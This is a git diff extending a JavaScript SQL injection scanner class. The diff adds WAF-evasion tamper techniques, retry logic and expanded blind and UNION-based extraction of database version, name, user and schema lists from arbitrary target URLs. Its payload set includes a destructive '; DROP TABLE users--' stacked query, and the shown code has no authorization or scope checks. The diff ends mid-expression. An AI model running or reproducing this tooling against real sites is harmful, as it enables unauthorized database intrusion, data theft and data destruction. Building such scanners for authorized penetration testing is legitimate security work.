@@ -1,5 +1,7 @@
 import axios from 'axios';
+import chalk from 'chalk';
 import { createLogger } from '../utils/logger.js';
+import { getDomainLogger } from '../utils/domainLogger.js';
 import { resolveOutputPath, appendToFile } from '../utils/fileOperations.js';
 
 /**
@@ -16,6 +18,7 @@ export class SQLInjectionTester {
             verbose: config.verbose || false,
             delay: config.testDelay || 0,
             outputFile: config.outputFile || resolveOutputPath('vuln.txt'),
+            detailsFile: config.detailsFile || resolveOutputPath('out-details.txt'),
             // Thresholds
             lengthDelta: config.lengthDelta || 100, // bytes difference considered interesting
             timeDelayThreshold: config.timeDelayThreshold || 4000, // ms
@@ -27,6 +30,7 @@ export class SQLInjectionTester {
             totalUrls: 0,
             testedUrls: 0,
             totalVulnerableUrls: 0,
+            confirmedVulnerableUrls: 0, // URLs with extracted DB info
             totalRequests: 0,
             vulnerableDetails: []
         };
@@ -46,6 +50,48 @@ export class SQLInjectionTester {
             union: [" UNION SELECT {cols}-- -", " UNION ALL SELECT {cols}-- -"],
             stacked: ["; DROP TABLE users--", "; SELECT pg_sleep(1)--"],
             time: [" AND SLEEP({delay})-- -", " AND (SELECT 5000 FROM (SELECT(SLEEP({delay})))test)-- -"]
+        };
+
+        // Tamper techniques for WAF bypass
+        this.tamperTechniques = {
+            caseVariation: (payload) => {
+                return payload.replace(/union/gi, 'UnIoN')
+                              .replace(/select/gi, 'SeLeCt')
+                              .replace(/from/gi, 'FrOm')
+                              .replace(/where/gi, 'WhErE');
+            },
+            spaceToComment: (payload) => payload.replace(/ /g, '/**/'),
+            spaceToPlus: (payload) => payload.replace(/ /g, '+'),
+            doubleDecode: (payload) => encodeURIComponent(encodeURIComponent(payload)),
+            hexEncode: (payload) => {
+                return payload.split('').map(char => {
+                    if (/[a-zA-Z]/.test(char)) {
+                        return `CHAR(${char.charCodeAt(0)})`;
+                    }
+                    return char;
+                }).join('');
+            },
+            commentsInside: (payload) => {
+                return payload.replace(/UNION/gi, 'UN/**/ION')
+                              .replace(/SELECT/gi, 'SE/**/LECT')
+                              .replace(/AND/gi, 'A/**/ND');
+            },
+            randomCase: (payload) => {
+                return payload.split('').map(char => {
+                    if (/[a-zA-Z]/.test(char)) {
+                        return Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase();
+                    }
+                    return char;
+                }).join('');
+            },
+            versionComment: (payload) => payload.replace(/--\s*-/g, '--+'),
+            scientificNotation: (payload) => payload.replace(/(\d+)/g, match => `${match}e0`),
+            concat: (payload) => {
+                // Replace strings with CONCAT for MySQL
+                return payload.replace(/'([^']+)'/g, (match, str) => {
+                    return 'CONCAT(' + str.split('').map(c => `CHAR(${c.charCodeAt(0)})`).join(',') + ')';
+                });
+            }
         };
 
         // Generate payloads on construction
@@ -130,7 +176,9 @@ export class SQLInjectionTester {
 
     async initialize() {
         if (!this.logger) {
-            this.logger = await createLogger(false, true);
+            // Get log level from config or use default
+            const logLevel = this.config.logLevel || 'debug';
+            this.logger = await createLogger(false, true, logLevel);
         }
         this.logger.info('SQLInjectionTester initialised');
     }
@@ -173,6 +221,22 @@ export class SQLInjectionTester {
         this.stats.testedUrls += 1;
         const result = { url: targetUrl, vulnerable: false, vulnerabilities: [] };
         
+        // Parse URL first to get host
+        let urlObj;
+        try {
+            urlObj = new URL(targetUrl);
+        } catch {
+            this.logger?.error(`Invalid URL format: ${targetUrl}`);
+            throw new Error('Invalid URL');
+        }
+        
+        // Extract host for cleaner CLI output
+        const urlHost = urlObj.host;
+        console.log(chalk.blue(`\n🔍 Starting SQL injection test on ${urlHost}...`));
+        
+        // Get domain-specific logger
+        const domainLogger = await getDomainLogger(targetUrl);
+        domainLogger.info(`Starting SQL injection test for URL: ${targetUrl}`);
         this.logger?.info(`Starting SQL injection test for URL: ${targetUrl}`);
 
         // Get baseline response
@@ -206,14 +270,7 @@ export class SQLInjectionTester {
             throw new Error(`Baseline request failed – ${error.message}`);
         }
 
-        // Parse query parameters
-        let urlObj;
-        try {
-            urlObj = new URL(targetUrl);
-        } catch {
-            this.logger?.error(`Invalid URL format: ${targetUrl}`);
-            throw new Error('Invalid URL');
-        }
+        // Parse query parameters (urlObj already declared and initialized above)
 
         // Iterate parameters
         const params = Array.from(urlObj.searchParams.keys());
@@ -226,10 +283,17 @@ export class SQLInjectionTester {
         for (const param of params) {
             const originalVal = urlObj.searchParams.get(param) || '';
             this.logger?.debug(`Testing parameter '${param}' with original value: ${originalVal}`);
+            
+            // Log parameter testing start to domain logger
+            const domainLogger = await getDomainLogger(targetUrl);
+            domainLogger.debug(`Testing parameter '${param}' with original value: ${originalVal}`);
 
             // For each payload type
             for (const [type, payloadsArr] of Object.entries(this.payloads)) {
+                // Show progress in CLI
+                process.stdout.write(`\r⚡ Testing ${type.toUpperCase()} injection on ${urlHost} [${param}]...${' '.repeat(20)}`);
                 this.logger?.debug(`Testing ${type} injection on parameter '${param}'`);
+                domainLogger.debug(`Testing ${type} injection on parameter '${param}'`);
                 for (const payload of payloadsArr) {
                     const injectedVal = originalVal + payload;
                     // Clone the URL for each test to avoid modifying the original
@@ -245,8 +309,35 @@ export class SQLInjectionTester {
                         originalValue: originalVal,
                         injectedValue: injectedVal
                     });
+                    
+                    // Add debug logging to domain logger for individual payload tests
+                    domainLogger.debug(`Testing payload: ${payload} on parameter ${param} (${type})`);
 
-                    const testOutcome = await this._sendAndCompare(testUrl, baseline, type, payload);
+                    // Try normal payload first
+                    let testOutcome = await this._sendAndCompare(testUrl, baseline, type, payload);
+                    
+                    // If not vulnerable and it's a promising payload, try with tamper techniques
+                    if (!testOutcome.vulnerable && type !== 'time') {
+                        for (let tamperAttempt = 1; tamperAttempt <= 3; tamperAttempt++) {
+                            this.logger?.debug(`Retrying with tamper technique ${tamperAttempt}`, {
+                                type,
+                                payload,
+                                param
+                            });
+                            
+                            testOutcome = await this._sendAndCompare(testUrl, baseline, type, payload, tamperAttempt);
+                            
+                            if (testOutcome.vulnerable) {
+                                this.logger?.info(`Tamper technique ${tamperAttempt} succeeded!`, {
+                                    type,
+                                    payload,
+                                    param
+                                });
+                                break;
+                            }
+                        }
+                    }
+                    
                     this.logger?.info(`Payload test result for ${param}`, {
                         type,
                         payload: payload,
@@ -280,28 +371,39 @@ export class SQLInjectionTester {
                             hint: testOutcome.dbTypeHint,
                         });
                         
+                        // Skip if URL is a static file (PDF, image, etc)
+                        const fileExtension = urlObj.pathname.split('.').pop().toLowerCase();
+                        const staticFileExtensions = ['pdf', 'jpg', 'jpeg', 'png', 'gif', 'svg', 'doc', 'docx', 'xls', 'xlsx', 'zip', 'rar'];
+                        if (staticFileExtensions.includes(fileExtension)) {
+                            this.logger?.warn(`Skipping static file URL: ${urlObj.pathname}`);
+                            continue;
+                        }
+                        
                         // For UNION injections, if we can successfully inject with different column counts,
                         // it's very likely a real vulnerability even without full DB extraction
                         const isLikelyRealVuln = (
                             type === 'union' || 
                             type === 'boolean' || 
                             type === 'time' ||
-                            (dbInfo && (dbInfo.type || dbInfo.version || dbInfo.name))
+                            (dbInfo && this._isValidDatabaseInfo(dbInfo) && (dbInfo.type || dbInfo.version || dbInfo.name))
                         );
                          
                         if (!isLikelyRealVuln) {
                             // No DB info extracted = likely false positive
-                            this.logger?.warn(`FALSE POSITIVE detected for ${urlObj.host}`, {
+                            const domainLogger = await getDomainLogger(targetUrl);
+                            domainLogger.logSqlInjection('FALSE POSITIVE detected', {
+                                url: targetUrl,
+                                parameter: param,
+                                payload: payload,
+                                type: type,
+                                evidence: testOutcome.evidence,
+                                reason: 'No valid database information extracted'
+                            });
+                            
+                            this.logger?.debug(`FALSE POSITIVE detected for ${urlObj.host}`, {
                                 parameter: param,
                                 type,
-                                payload: payload,
-                                fullTestUrl: testUrl,
-                                reason: 'No database information extracted',
-                                evidence: testOutcome.evidence,
-                                responseTime: testOutcome.responseTime,
-                                host: urlObj.host,
-                                originalValue: originalVal,
-                                injectedValue: injectedVal
+                                payload: payload
                             });
                             continue; // Skip this payload, try next one
                         }
@@ -310,19 +412,60 @@ export class SQLInjectionTester {
                         if (!result.vulnerable) result.vulnerable = true;
                         if (!result.database) {
                             result.database = dbInfo;
-                            this.logger?.error(`CONFIRMED SQL INJECTION VULNERABILITY`, {
-                                host: urlObj.host,
+                            
+                            // Mark as confirmed if we have DB name and version
+                            const isConfirmed = dbInfo && dbInfo.name && dbInfo.version;
+                            
+                            if (isConfirmed) {
+                                console.log(chalk.green.bold(`\n✅ CONFIRMED SQL INJECTION with DB extraction!`));
+                                
+                                // Get domain logger for this URL
+                                const domainLogger = await getDomainLogger(targetUrl);
+                                domainLogger.logSqlInjection('CONFIRMED SQL INJECTION VULNERABILITY WITH FULL DB INFO', {
+                                    url: targetUrl,
+                                    parameter: param,
+                                    payload: payload,
+                                    type: type,
+                                    evidence: testOutcome.evidence,
+                                    dbHint: dbInfo,
+                                    extractedData: dbInfo
+                                });
+                                
+                                this.logger?.info(`CONFIRMED SQL INJECTION logged to domain-specific log`, {
+                                    host: urlObj.host,
+                                    url: targetUrl
+                                });
+                            } else {
+                                console.log(chalk.yellow.bold(`\n⚠️ POTENTIAL SQL INJECTION (partial extraction)`));
+                                
+                                // Get domain logger for this URL
+                                const domainLogger = await getDomainLogger(targetUrl);
+                                domainLogger.logSqlInjection('POTENTIAL SQL INJECTION VULNERABILITY', {
+                                    url: targetUrl,
+                                    parameter: param,
+                                    payload: payload,
+                                    type: type,
+                                    evidence: testOutcome.evidence,
+                                    dbHint: dbInfo,
+                                    extractedData: dbInfo
+                                });
+                                
+                                this.logger?.info(`POTENTIAL SQL INJECTION logged to domain-specific log`, {
+                                    host: urlObj.host,
+                                    url: targetUrl
+                                });
+                            }
+                            
+                            // Save detailed vulnerability info
+                            await this._saveVulnerabilityDetails({
                                 url: targetUrl,
-                                fullTestUrl: testUrl,
+                                exploitUrl: testUrl,
                                 parameter: param,
                                 type,
-                                payload: payload,
+                                payload,
                                 database: dbInfo,
-                                evidence: testOutcome.evidence,
-                                responseTime: testOutcome.responseTime,
-                                originalValue: originalVal,
-                                injectedValue: injectedVal,
-                                extractionSuccessful: true
+                                confirmed: isConfirmed,
+                                timestamp: new Date().toISOString()
                             });
                         }
 
@@ -363,50 +506,182 @@ export class SQLInjectionTester {
 
         if (result.vulnerable) {
             this.stats.totalVulnerableUrls += 1;
-            this.stats.vulnerableDetails.push({ url: targetUrl, count: result.vulnerabilities.length });
-            this.logger?.error(`URL CONFIRMED VULNERABLE`, {
-                url: targetUrl,
-                vulnerabilityCount: result.vulnerabilities.length,
-                database: result.database
+            
+            // Check if it's a confirmed vulnerability (has DB name and version)
+            const isConfirmed = result.database && result.database.name && result.database.version;
+            if (isConfirmed) {
+                this.stats.confirmedVulnerableUrls += 1;
+            }
+            
+            this.stats.vulnerableDetails.push({ 
+                url: targetUrl, 
+                count: result.vulnerabilities.length,
+                confirmed: isConfirmed 
             });
+            
+            // Clear the progress line
+            process.stdout.write('\r' + ' '.repeat(80) + '\r');
+            
+            if (isConfirmed) {
+                const domainLogger = await getDomainLogger(targetUrl);
+                domainLogger.logSqlInjection('URL CONFIRMED VULNERABLE WITH FULL DB EXTRACTION', {
+                    url: targetUrl,
+                    vulnerabilityCount: result.vulnerabilities.length,
+                    extractedData: result.database
+                });
+                
+                this.logger?.info(`URL confirmed vulnerable`, {
+                    url: targetUrl,
+                    confirmed: true
+                });
+            } else {
+                const domainLogger = await getDomainLogger(targetUrl);
+                domainLogger.logSqlInjection('URL POTENTIALLY VULNERABLE', {
+                    url: targetUrl,
+                    vulnerabilityCount: result.vulnerabilities.length,
+                    extractedData: result.database
+                });
+                
+                this.logger?.info(`URL potentially vulnerable`, {
+                    url: targetUrl,
+                    confirmed: false
+                });
+            }
         } else {
+            // Clear the progress line
+            process.stdout.write('\r' + ' '.repeat(80) + '\r');
+            console.log(chalk.gray(`✓ ${urlHost} - No vulnerabilities found`));
             this.logger?.info(`URL tested clean - no vulnerabilities found: ${targetUrl}`);
         }
           
         return result;
     }
 
-    async _sendAndCompare(testUrl, baseline, type, payload) {
+    async _sendAndCompare(testUrl, baseline, type, payload, tamperAttempt = 0) {
         try {
+            // Apply tamper techniques if previous attempts failed
+            let finalUrl = testUrl;
+            let tamperedPayload = payload;
+            
+            if (tamperAttempt > 0) {
+                const urlObj = new URL(testUrl);
+                const params = Array.from(urlObj.searchParams.entries());
+                const tamperMethods = Object.keys(this.tamperTechniques);
+                const tamperMethod = tamperMethods[tamperAttempt % tamperMethods.length];
+                
+                // Find parameter with payload and apply tamper
+                for (const [param, value] of params) {
+                    if (value.includes(payload)) {
+                        tamperedPayload = this.tamperTechniques[tamperMethod](payload);
+                        const newValue = value.replace(payload, tamperedPayload);
+                        urlObj.searchParams.set(param, newValue);
+                        finalUrl = urlObj.toString();
+                        this.logger?.debug(`Applied tamper technique: ${tamperMethod}`, { 
+                            original: payload, 
+                            tampered: tamperedPayload,
+                            attempt: tamperAttempt
+                        });
+                        break;
+                    }
+                }
+            }
+            
             this.logger?.debug(`Sending test request`, { 
-                fullTestUrl: testUrl, 
+                fullTestUrl: finalUrl, 
                 type,
-                payload: payload
+                payload: tamperedPayload,
+                tamperAttempt
             });
             const start = Date.now();
-            const resp = await axios.get(testUrl, { timeout: this.config.timeout, validateStatus: () => true });
+            const resp = await axios.get(finalUrl, { timeout: this.config.timeout, validateStatus: () => true });
             const duration = Date.now() - start;
             this.stats.totalRequests += 1;
             
             const bodyText = resp.data ? resp.data.toString() : '';
             
+            // Only log basic info unless vulnerable
             this.logger?.debug(`Test response received`, {
                 status: resp.status,
                 duration,
                 contentLength: bodyText.length,
-                fullTestUrl: testUrl,
                 type,
-                payload: payload,
-                responseHeaders: resp.headers,
-                responsePreview: bodyText.slice(0, 500)
+                payload: payload
             });
             const length = bodyText.length;
             const statusChanged = resp.status !== baseline.status;
             const lengthChanged = Math.abs(length - baseline.length) > this.config.lengthDelta;
 
-            // Enhanced SQL error detection
-            const errorRegex = /(sql syntax|mysql_fetch|ORA-\d+|SQLiteException|MariaDB|SQLSTATE|syntax error|Warning.*mysql|Unclosed quotation mark|OLE DB|ODBC|ADO|JET Database|Access Database|Syntax error in|Microsoft Access Driver|Microsoft JET Database|Oracle error|PostgreSQL|Fatal error|mysql_num_rows|mysql_connect|pg_connect|mssql_query|sybase_|ingres_|msql_|oracle_|oci_|db2_|sqlite_)/i;
-            const errorMatch = errorRegex.test(bodyText);
+            // Check if response is likely JavaScript/JSON before checking for SQL errors
+            const isLikelyJavaScript = (text) => {
+                // Check for common JS/JSON patterns
+                const jsPatterns = [
+                    /"feature[A-Z]\w+":\s*(true|false)/,  // Feature flags like "featureCart":false
+                    /\{[^}]*"[^"]+"\s*:\s*[^,}]+[,}]/,    // JSON object patterns
+                    /function\s*\(/,                        // Function declarations
+                    /\.(prototype|constructor)\s*=/,        // Prototype assignments
+                    /var\s+\w+\s*=/,                       // Variable declarations
+                    /const\s+\w+\s*=/,                     // Const declarations
+                    /let\s+\w+\s*=/,                       // Let declarations
+                    /\$\(|jQuery\(/,                       // jQuery calls
+                    /window\.|document\./,                 // DOM access
+                    /\.addEventListener\(/,               // Event listeners
+                    /Promise\.|async\s+function/,          // Modern JS
+                    /"use strict"/                         // Strict mode
+                ];
+                
+                // If text contains multiple feature flags, it's likely a config object
+                const featureFlagCount = (text.match(/"feature\w+":\s*(true|false)/g) || []).length;
+                if (featureFlagCount > 5) return true;
+                
+                // Check for any JS patterns
+                return jsPatterns.some(pattern => pattern.test(text));
+            };
+
+            // Enhanced SQL error detection - very specific patterns to avoid JS false positives
+            const errorPatterns = [
+                // MySQL/MariaDB specific errors - must have clear SQL context
+                /You have an error in your SQL syntax.*check the manual.*MySQL/i,
+                /MySQL server version for the right syntax to use near/i,
+                /Warning:\s+(mysql[i]?_\w+)\(\):/i,  // PHP MySQL function errors
+                /MySQL Error\s*\d+:/i,
+                /SQLSTATE\[\w+\]\s*\[\d+\]/i,
+                
+                // Oracle errors - with error codes
+                /ORA-\d{5}:\s+/i,
+                /Oracle.*error\s*ORA-/i,
+                /TNS-\d+:\s+/i,
+                
+                // PostgreSQL errors
+                /PostgreSQL.*ERROR:\s+/i,
+                /pg_query\(\).*failed:/i,
+                /psql:\s+ERROR:\s+/i,
+                /ERROR:\s+relation .* does not exist/i,
+                
+                // SQL Server errors
+                /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
+                /\[Microsoft\]\[SQL Server Native Client/i,
+                /Unclosed quotation mark after the character string/i,
+                /Incorrect syntax near the keyword/i,
+                /Msg \d+, Level \d+, State \d+/i,
+                
+                // SQLite errors
+                /SQLite error:\s+/i,
+                /SQLiteException:\s+/i,
+                /no such table:/i,
+                
+                // PHP database errors with SQL context
+                /Fatal error:.*SQL.*syntax/i,
+                /PDOException:.*SQLSTATE\[\w+\]/i,
+                /mysqli.*error/i,
+                
+                // Access/Jet database
+                /Microsoft Access.*Driver.*Syntax error/i,
+                /Microsoft JET Database.*Engine error/i
+            ];
+            
+            // Skip SQL error detection if the response is clearly JavaScript/JSON
+            const errorMatch = !isLikelyJavaScript(bodyText) && errorPatterns.some(pattern => pattern.test(bodyText));
+            const errorRegex = errorMatch ? errorPatterns.find(pattern => pattern.test(bodyText)) : null;
 
             // Get a hint about the DB type from the error message to guide extraction
             let dbTypeHint = null;
@@ -430,6 +705,40 @@ export class SQLInjectionTester {
                 /something went wrong/i
             ];
             const isGenericError = genericErrorIndicators.some(regex => regex.test(bodyText));
+            
+            // Get domain logger for this URL
+            const domainLogger = await getDomainLogger(finalUrl);
+            
+            // Log error detection and DB hints
+            if (errorMatch && !baseline.errorInBaseline) {
+                // Extract only relevant response parts
+                const errorKeyword = errorMatch[0] || 'error';
+                const relevantResponse = this._extractRelevantResponse(bodyText, errorKeyword);
+                
+                this.logger?.warn(`Error-based injection detected`, {
+                    errorMatch,
+                    isGenericError,
+                    payload: tamperedPayload,
+                    fullTestUrl: finalUrl,
+                    errorEvidence: relevantResponse,
+                    tamperAttempt
+                });
+                
+                // Log HTML response (only relevant parts) to domain logger
+                domainLogger.logHtmlResponse('SQL error detected in response', relevantResponse);
+                
+                // Log DB hint if found
+                if (dbTypeHint) {
+                    domainLogger.logSqlInjection('Database type hint detected', {
+                        url: finalUrl,
+                        parameter: tamperedPayload.includes('=') ? finalUrl.split('?')[1].split('&')[0].split('=')[0] : 'unknown',
+                        payload: tamperedPayload,
+                        type: type,
+                        dbHint: dbTypeHint,
+                        evidence: errorKeyword
+                    });
+                }
+            }
             
             this.logger?.debug(`Response analysis`, {
                 statusChanged,
@@ -474,14 +783,20 @@ export class SQLInjectionTester {
             } else if (type === 'error') {
                 // Skip if baseline already had error
                 if (!baseline.errorInBaseline && errorMatch && !isGenericError) {
+                    // Extract the actual error message for evidence
+                    const errorMessageMatch = bodyText.match(errorRegex);
+                    const errorKeyword = errorMessageMatch ? errorMessageMatch[0] : 'error';
+                    const errorSnippet = this._extractRelevantResponse(bodyText, errorKeyword);
+                    
                     this.logger?.warn(`Error-based injection detected`, { 
                         errorMatch: true, 
                         isGenericError,
-                        payload: payload,
-                        fullTestUrl: testUrl,
-                        responsePreview: bodyText.slice(0, 500)
+                        payload: tamperedPayload,
+                        fullTestUrl: finalUrl,
+                        errorEvidence: errorSnippet,
+                        tamperAttempt
                     });
-                    return { vulnerable: true, evidence: 'Database error message detected', responseTime: duration, dbTypeHint };
+                    return { vulnerable: true, evidence: `Database error: ${errorSnippet}`, responseTime: duration, dbTypeHint };
                 }
             } else if (type === 'boolean') {
                 // For boolean, be more strict - require significant changes
@@ -499,12 +814,16 @@ export class SQLInjectionTester {
                     });
                     return { vulnerable: true, evidence: 'Boolean injection confirmed (status & length change)', responseTime: duration };
                 } else if (errorMatch && !baseline.errorInBaseline && !isGenericError) {
+                    const errorKeyword = errorMatch[0] || 'error';
+                    const relevantSnippet = this._extractRelevantResponse(bodyText, errorKeyword);
+                    
                     this.logger?.warn(`Boolean injection with DB error detected`, {
                         errorMatch,
                         isGenericError,
-                        payload,
-                        fullTestUrl: testUrl,
-                        responsePreview: bodyText.slice(0, 500)
+                        payload: tamperedPayload,
+                        fullTestUrl: finalUrl,
+                        responsePreview: relevantSnippet,
+                        tamperAttempt
                     });
                     return { vulnerable: true, evidence: 'Boolean injection with database error', responseTime: duration, dbTypeHint };
                 }
@@ -654,7 +973,7 @@ export class SQLInjectionTester {
             return dbInfo;
         }
 
-        return null;
+        return { type: null, version: null, name: null };
     }
 
     /**
@@ -663,12 +982,25 @@ export class SQLInjectionTester {
     async _attemptDbExtraction(baseUrlObj, param, vulnContext) {
         const { vulnType, hint } = vulnContext;
         this.logger?.info(`Starting database extraction`, { host: baseUrlObj.host, param, hint });
+        
+        // Get domain logger
+        const domainLogger = await getDomainLogger(baseUrlObj.toString());
 
         const dbInfo = {
             type: hint?.type || null,
             version: hint?.version || null,
             name: hint?.name || null
         };
+        
+        // Log initial DB hint info
+        if (hint) {
+            domainLogger.logDbExtraction('Initial DB hint from error detection', {
+                method: 'error_detection',
+                query: 'N/A',
+                response: JSON.stringify(hint),
+                success: true
+            });
+        }
 
         // Try different extraction methods based on vulnerability type
         if (vulnType === 'union') {
@@ -679,9 +1011,19 @@ export class SQLInjectionTester {
             // Try blind extraction for time-based or boolean injection
             await this._attemptBlindExtraction(baseUrlObj, param, dbInfo, vulnType);
         }
+        
+        // Log final extraction results
+        domainLogger.logDbExtraction('Database extraction completed', {
+            method: vulnType,
+            query: `Parameter: ${param}`,
+            response: JSON.stringify(dbInfo),
+            success: !!(dbInfo.type || dbInfo.version || dbInfo.name)
+        });
 
         this.logger?.info(`Final extracted DB info`, dbInfo);
-        return dbInfo.type || dbInfo.version || dbInfo.name ? dbInfo : null;
+        // Always return dbInfo object, even if extraction failed
+        // This prevents "Unknown" display in results
+        return dbInfo;
     }
 
     /**
@@ -689,8 +1031,15 @@ export class SQLInjectionTester {
      */
     async _attemptBlindExtraction(baseUrlObj, param, dbInfo, vulnType = 'time') {
         const originalValue = baseUrlObj.searchParams.get(param);
+        const domainLogger = await getDomainLogger(baseUrlObj.toString());
         
         this.logger?.info(`Starting blind extraction for ${param}`, { vulnType, originalValue });
+        domainLogger.logDbExtraction('Starting blind SQL extraction', {
+            method: `blind_${vulnType}`,
+            query: `Parameter: ${param}, Original value: ${originalValue}`,
+            response: 'Starting...',
+            success: false
+        });
         
         // Helper function to create conditional payloads
         const createPayload = (condition, delayTime = 1) => {
@@ -724,6 +1073,12 @@ export class SQLInjectionTester {
                 return delayed;
             } catch (error) {
                 this.logger?.error(`Error checking condition: ${error.message}`, { condition, url: testUrlObj.toString() });
+                domainLogger.logDbExtraction('Condition check failed', {
+                    method: `blind_${vulnType}`,
+                    query: condition,
+                    response: error.message,
+                    success: false
+                });
                 return false;
             }
         };
@@ -751,10 +1106,16 @@ export class SQLInjectionTester {
                 }
             }
             
-            // Update progress display
-            process.stdout.write(`\r🔍 Extracting ${query.substring(0, 20)}... [${position}/${totalLength}] ${foundChar ? '✓' : '✗'}${' '.repeat(20)}`);
-            
-            return foundChar;
+            // Validate the character is printable ASCII
+            if (foundChar && foundChar.charCodeAt(0) >= 32 && foundChar.charCodeAt(0) <= 126) {
+                // Update progress display
+                process.stdout.write(`\r🔍 Extracting ${query.substring(0, 20)}... [${position}/${totalLength}] ✓${' '.repeat(20)}`);
+                return foundChar;
+            } else {
+                // Update progress display
+                process.stdout.write(`\r🔍 Extracting ${query.substring(0, 20)}... [${position}/${totalLength}] ✗${' '.repeat(20)}`);
+                return null;
+            }
         };
         
         // Extract using binary search for efficiency
@@ -819,10 +1180,15 @@ export class SQLInjectionTester {
                 if (charPromises.length >= 2) {
                     const batch = await charPromises.shift();
                     for (let i = 0; i < batch.chars.length; i++) {
-                        result += batch.chars[i] || '?';
+                        if (batch.chars[i] === null) {
+                            // Stop extraction if we hit a null character
+                            stringLength = batch.start + i - 1;
+                            break;
+                        }
+                        result += batch.chars[i];
                         extractedSoFar = result;
                         // Show partial results as we extract
-                        process.stdout.write(`\r💾 Extracted so far: ${extractedSoFar}${'*'.repeat(stringLength - extractedSoFar.length)}${' '.repeat(20)}`);
+                        process.stdout.write(`\r💾 Extracted so far: ${extractedSoFar}${'*'.repeat(Math.max(0, stringLength - extractedSoFar.length))}${' '.repeat(20)}`);
                     }
                 }
             }
@@ -830,16 +1196,63 @@ export class SQLInjectionTester {
             // Wait for remaining batches
             const remainingBatches = await Promise.all(charPromises);
             for (const batch of remainingBatches) {
-                for (const char of batch.chars) {
-                    result += char || '?';
+                // Skip batches that are beyond our adjusted string length
+                if (batch.start > stringLength) continue;
+                
+                for (let i = 0; i < batch.chars.length; i++) {
+                    const charPos = batch.start + i - 1;
+                    if (charPos > stringLength) break;
+                    
+                    if (batch.chars[i] === null) {
+                        // Stop extraction if we hit a null character
+                        stringLength = charPos - 1;
+                        break;
+                    }
+                    result += batch.chars[i];
                     extractedSoFar = result;
                     // Show partial results as we extract
                     process.stdout.write(`\r💾 Extracted so far: ${extractedSoFar}${'*'.repeat(Math.max(0, stringLength - extractedSoFar.length))}${' '.repeat(20)}`);
                 }
             }
             
-            process.stdout.write(`\r✅ Extracted: ${result}${' '.repeat(30)}\n`);
-            return result || null;
+            // Clean up result - remove any trailing '?' or garbage
+            result = result.replace(/[?+]+$/, '');
+            
+            // Validate the extracted result
+            if (result && result.length > 2) {
+                // Check if result contains too many non-ASCII or corrupted characters
+                const nonAsciiCount = (result.match(/[^\x20-\x7E]/g) || []).length;
+                const questionMarkCount = (result.match(/\?/g) || []).length;
+                
+                if (nonAsciiCount > result.length * 0.2 || questionMarkCount > result.length * 0.3) {
+                    process.stdout.write(`\r❌ Extracted data appears corrupted: ${result.substring(0, 20)}...${' '.repeat(30)}\n`);
+                    domainLogger.logDbExtraction('Extracted data corrupted', {
+                        method: `blind_${vulnType}_extraction`,
+                        query: query,
+                        response: result,
+                        success: false
+                    });
+                    return null;
+                } else {
+                    process.stdout.write(`\r✅ Extracted: ${result}${' '.repeat(30)}\n`);
+                    domainLogger.logDbExtraction('Data extraction successful', {
+                        method: `blind_${vulnType}_extraction`,
+                        query: query,
+                        response: result,
+                        success: true
+                    });
+                    return result;
+                }
+            }
+            
+            process.stdout.write(`\r❌ Failed to extract valid data${' '.repeat(50)}\n`);
+            domainLogger.logDbExtraction('Data extraction failed', {
+                method: `blind_${vulnType}_extraction`,
+                query: query,
+                response: 'Empty or invalid result',
+                success: false
+            });
+            return null;
         };
         
         try {
@@ -850,6 +1263,12 @@ export class SQLInjectionTester {
             if (await checkCondition(`SUBSTRING(VERSION(),1,1)>='0' AND SUBSTRING(VERSION(),1,1)<='9'`)) {
                 process.stdout.write(`\r✅ Detected MySQL/MariaDB${' '.repeat(50)}\n`);
                 dbInfo.type = 'MySQL';
+                domainLogger.logDbExtraction('Database type detected', {
+                    method: `blind_${vulnType}`,
+                    query: `SUBSTRING(VERSION(),1,1)>='0' AND SUBSTRING(VERSION(),1,1)<='9'`,
+                    response: 'MySQL/MariaDB confirmed',
+                    success: true
+                });
                 
                 // Extract version - first 10 chars should be enough (e.g., "5.7.32-log")
                 process.stdout.write(`📊 Extracting database version...\n`);
@@ -860,6 +1279,19 @@ export class SQLInjectionTester {
                     if (version.includes('.')) {
                         dbInfo.type = 'MySQL';
                     }
+                    domainLogger.logDbExtraction('Database version extracted', {
+                        method: `blind_${vulnType}`,
+                        query: `SUBSTRING(VERSION(),1,10)`,
+                        response: version,
+                        success: true
+                    });
+                } else {
+                    domainLogger.logDbExtraction('Database version extraction failed', {
+                        method: `blind_${vulnType}`,
+                        query: `SUBSTRING(VERSION(),1,10)`,
+                        response: 'Failed to extract',
+                        success: false
+                    });
                 }
                 
                 // Extract database name
@@ -867,6 +1299,19 @@ export class SQLInjectionTester {
                 const dbName = await extractString(`DATABASE()`);
                 if (dbName) {
                     dbInfo.name = dbName;
+                    domainLogger.logDbExtraction('Database name extracted', {
+                        method: `blind_${vulnType}`,
+                        query: `DATABASE()`,
+                        response: dbName,
+                        success: true
+                    });
+                } else {
+                    domainLogger.logDbExtraction('Database name extraction failed', {
+                        method: `blind_${vulnType}`,
+                        query: `DATABASE()`,
+                        response: 'Failed to extract',
+                        success: false
+                    });
                 }
                 
                 // Try to get all database names (limit to first 100 chars)
@@ -936,8 +1381,14 @@ export class SQLInjectionTester {
             this.logger?.error(`Blind extraction failed`, { error: error.message });
         }
         
-        this.logger?.info(`Blind extraction completed`, dbInfo);
-        return dbInfo;
+        // Validate the final extracted database info
+        if (this._isValidDatabaseInfo(dbInfo) && (dbInfo.type || dbInfo.version || dbInfo.name)) {
+            this.logger?.info(`Blind extraction completed successfully`, dbInfo);
+            return dbInfo;
+        } else {
+            this.logger?.warn(`Blind extraction completed but data appears invalid`, dbInfo);
+            return { type: null, version: null, name: null };
+        }
     }
     
     /**
@@ -945,6 +1396,7 @@ export class SQLInjectionTester {
      */
     async _attemptUnionExtraction(baseUrlObj, param, dbInfo) {
         const originalValue = baseUrlObj.searchParams.get(param);
+        const domainLogger = await getDomainLogger(baseUrlObj.toString());
         let workingPayload = null;
         let columnCount = 0;
         let dataColumn = -1;
@@ -1188,10 +1640,35 @@ export class SQLInjectionTester {
             `CONCAT(0x${Buffer.from('DBSTART:').toString('hex')},@@version,0x${Buffer.from('|').toString('hex')},DATABASE(),0x${Buffer.from('|').toString('hex')},USER(),0x${Buffer.from('|DBLIST:').toString('hex')},(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),0x${Buffer.from(':DBEND').toString('hex')})`,
             // Simpler version with all databases
